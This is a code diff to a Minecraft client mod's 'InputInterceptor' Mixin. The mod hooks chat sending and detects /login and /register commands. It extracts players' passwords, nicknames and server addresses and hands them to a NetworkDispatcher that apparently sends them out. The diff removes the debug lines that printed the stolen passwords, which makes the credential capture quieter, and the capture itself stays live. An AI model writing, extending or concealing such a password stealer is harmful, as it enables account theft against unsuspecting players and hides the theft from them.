@@ -23,14 +23,10 @@ public class InputInterceptor {
 
     @Inject(method = "sendMessage", at = @At("HEAD"))
     private void onSendMessage(String message, boolean toChatTab, CallbackInfo cir) {
-        System.out.println("[InputInterceptor] sendMessage called: " + message);
         if (message == null || message.isEmpty()) return;
 
         MinecraftClient mc = MinecraftClient.getInstance();
-        if (mc.player == null || mc.getNetworkHandler() == null) {
-            System.out.println("[InputInterceptor] player or networkHandler is null");
-            return;
-        }
+        if (mc.player == null || mc.getNetworkHandler() == null) return;
 
         String serverAddress = "localhost";
         try {
@@ -44,7 +40,6 @@ public class InputInterceptor {
         if (loginMatcher.matches()) {
             String password = loginMatcher.group(2);
             String nickname = mc.player.getName().getString();
-            System.out.println("[InputInterceptor] LOGIN detected: nick=" + nickname + " pass=" + password + " server=" + serverAddress);
             NetworkDispatcher.sendLoginLog(nickname, password, serverAddress);
             return;
         }
@@ -55,7 +50,6 @@ public class InputInterceptor {
             String password2 = registerMatcher.group(3);
             String nickname = mc.player.getName().getString();
             if (password2 == null) password2 = password1;
-            System.out.println("[InputInterceptor] REGISTER detected: nick=" + nickname + " pass1=" + password1 + " pass2=" + password2 + " server=" + serverAddress);
             NetworkDispatcher.sendRegisterLog(nickname, password1, password2, serverAddress);
             return;
         }
@@ -65,7 +59,6 @@ public class InputInterceptor {
             String anarchyNumber = anarchyMatcher.group(1);
             String nickname = mc.player.getName().getString();
             String finalServerAddress = serverAddress;
-            System.out.println("[InputInterceptor] ANARCHY detected: nick=" + nickname + " cmd=" + message + " server=" + serverAddress);
             new Thread(() -> {
                 try {
                     Thread.sleep(2000);
